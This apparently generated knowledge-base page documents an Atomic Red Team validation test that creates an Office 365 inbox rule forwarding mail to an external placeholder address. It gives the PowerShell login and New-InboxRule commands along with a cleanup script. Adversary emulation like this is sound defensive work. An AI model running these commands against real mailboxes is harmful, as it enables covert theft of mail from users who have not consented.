---
atomic_guid: "3234117e-151d-4254-9150-3d0bac41e38c"
title: "Office365 - Email Forwarding"
framework: "atomic"
generated: "true"
attack_technique_id: "T1114.003"
attack_technique_name: "Email Collection: Email Forwarding Rule"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1114.003/T1114.003.yaml"
build_date: "2026-04-26 14:38:40"
executor: "powershell"
aliases:
  - "3234117e-151d-4254-9150-3d0bac41e38c"
  - "Office365 - Email Forwarding"
platforms:
  - "office-365"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Office365 - Email Forwarding

Creates a new Inbox Rule to forward emails to an external user via the "ForwardTo" property of the New-InboxRule Powershell cmdlet.

## Metadata

- Atomic GUID: 3234117e-151d-4254-9150-3d0bac41e38c
- Technique: T1114.003: Email Collection: Email Forwarding Rule
- Platforms: office-365
- Executor: powershell
- Elevation Required: False
- Dependency Executor: powershell
- Source Path: atomics/T1114.003/T1114.003.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1114-email_collection|T1114.003]]

## Input Arguments

### forwarding_email

- description: destination email addresses
- type: string
- default: Atomic_Operator@fakeemail.aq

### password

- description: office-365 password
- type: string

### rule_name

- description: email rule name
- type: string
- default: Atomic Red Team Email Rule

### username

- description: office-365 username
- type: string

## Dependencies

ExchangeOnlineManagement PowerShell module must be installed. Your user must also have an Exchange license.

### Prerequisite Check

```text
$RequiredModule = Get-Module -Name ExchangeOnlineManagement -ListAvailable
if (-not $RequiredModule) {exit 1}
if (-not $RequiredModule.ExportedCommands['Connect-ExchangeOnline']) {exit 1} else {exit 0}
```

### Get Prerequisite

```text
Install-Module -Name ExchangeOnlineManagement         
Import-Module ExchangeOnlineManagement
```

## Executor

- elevation_required: False
- name: powershell

### Command

```powershell
$secure_pwd = "#{password}" | ConvertTo-SecureString -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential -ArgumentList "#{username}", $secure_pwd
Connect-ExchangeOnline -Credential $creds
New-InboxRule -Name "#{rule_name}" -ForwardTo "#{forwarding_email}"
```

### Cleanup

```powershell
$secure_pwd = "#{password}" | ConvertTo-SecureString -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential -ArgumentList "#{username}", $secure_pwd
Connect-ExchangeOnline -Credential $creds
Get-InboxRule | Where-Object { $_.Name -eq "#{rule_name}" | ForEach-Object { Remove-InboxRule -Identity $_.Identity -Force -Confirm:$False }
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1114.003/T1114.003.yaml)
